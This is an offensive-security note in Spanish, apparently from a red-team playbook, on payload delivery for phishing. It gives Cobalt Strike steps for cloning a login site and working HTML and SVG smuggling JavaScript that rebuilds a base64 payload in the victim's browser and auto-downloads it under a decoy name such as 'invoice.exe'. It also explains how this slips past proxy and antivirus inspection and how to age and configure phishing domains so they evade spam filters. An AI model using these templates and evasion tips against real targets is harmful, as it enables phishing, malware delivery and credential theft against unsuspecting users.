---
tags: [initial-access, phishing, delivery]
status: done
platform: windows
---

# Delivery

> Técnicas para entregar el payload al objetivo de forma convincente.

---

## Site Cloning (Cobalt Strike)

CS puede clonar sitios web y servirlos con los payloads embebidos:

```
Attacks → Web Drive-by → Clone Site
  URL to clone: https://target-login-page.com
  Local URI: /
  Local host/port: 0.0.0.0:80
```

---

## HTML Smuggling

El payload se reconstruye en el navegador del cliente mediante JavaScript, evitando inspección del proxy/gateway.

```html
<script>
  var file = 'BASE64_PAYLOAD_HERE';
  var data = Uint8Array.from(atob(file), c => c.charCodeAt(0));
  var blob = new Blob([data], {type: 'application/octet-stream'});
  var a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'update.exe';
  document.body.appendChild(a);
  a.click();
</script>
```

**Por qué funciona:** El archivo nunca atraviesa la red como binario — viaja como base64 dentro del HTML. Los proxies/AV de gateway no lo ven como un archivo ejecutable.

---

## SVG Smuggling

Variante del HTML Smuggling usando un SVG como vector:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="
  var data = Uint8Array.from(atob('BASE64_HERE'), c => c.charCodeAt(0));
  var blob = new Blob([data], {type:'application/octet-stream'});
  var a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'invoice.exe';
  document.body.appendChild(a);
  a.click();
"/>
```

**Ventaja:** Los SVG se abren automáticamente en el navegador sin prompt de descarga en algunos entornos.

---

## OPSEC

> ⚠️ Los dominios de phishing deben tener:
> - Certificado TLS válido (Let's Encrypt)
> - Categorización previa (registrar con 30+ días de antelación)
> - Mailserver SPF/DKIM/DMARC configurados para evitar spam filters

